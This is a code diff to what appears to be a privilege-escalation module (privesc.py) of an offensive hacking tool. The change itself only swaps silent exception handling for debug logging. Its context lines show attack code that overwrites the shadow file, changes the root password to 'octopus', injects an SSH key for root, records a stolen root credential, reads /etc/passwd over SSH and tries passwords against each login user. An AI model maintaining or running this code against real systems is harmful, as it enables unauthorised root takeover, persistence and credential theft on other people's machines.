@@ -1109,8 +1109,8 @@ void gconv_init() {
                                             with open(shadow_path, "w") as sf:
                                                 sf.write(shadow)
                                             output += f"  [+] Shadow saved to: {shadow_path}\n"
-                                        except Exception:
-                                            pass
+                                        except Exception as _exc:
+                                            logging.debug(f"Suppressed in privesc.py: {_exc}")
 
                                     # Step 4: Try chpasswd (may or may not work)
                                     chpasswd_result = _ssh_exec(client,
@@ -1129,8 +1129,8 @@ void gconv_init() {
                                                               allow_agent=False, look_for_keys=False)
                                             test_client.close()
                                             pw_changed = True
-                                        except Exception:
-                                            pass
+                                        except Exception as _exc:
+                                            logging.debug(f"Suppressed in privesc.py: {_exc}")
 
                                         if pw_changed:
                                             print(f"    {C_GREEN}[+] Root password changed to 'octopus' — VERIFIED{C_RESET}")
@@ -1178,8 +1178,8 @@ void gconv_init() {
                                                          allow_agent=False, look_for_keys=False)
                                             test2.close()
                                             key_ok = True
-                                        except Exception:
-                                            pass
+                                        except Exception as _exc:
+                                            logging.debug(f"Suppressed in privesc.py: {_exc}")
 
                                         if key_ok:
                                             print(f"    {C_GREEN}[+] SSH key injected for root — VERIFIED{C_RESET}")
@@ -1310,8 +1310,8 @@ void gconv_init() {
                                         register_credential("ssh", host, "root", "m3tatr0n")
                                     except ImportError:
                                         pass
-                        except Exception:
-                            pass
+                        except Exception as _exc:
+                            logging.debug(f"Suppressed in privesc.py: {_exc}")
                     if not got_root:
                         output += f"  [-] Shadow modification did not yield root access.\n"
 
@@ -1343,7 +1343,7 @@ void gconv_init() {
         # Get login users from /etc/passwd
         try:
             passwd_out = _ssh_exec(client, "cat /etc/passwd 2>/dev/null", timeout=8)
-        except Exception:
+        except Exception as e:
             passwd_out = ""
         login_users = []
         for line in passwd_out.splitlines():
@@ -1417,7 +1417,7 @@ void gconv_init() {
 
                 except _paramiko.AuthenticationException:
                     pass  # wrong password
-                except Exception:
+                except Exception as e:
                     break  # connection error, skip this user entirely
 
                 _time.sleep(0.1)
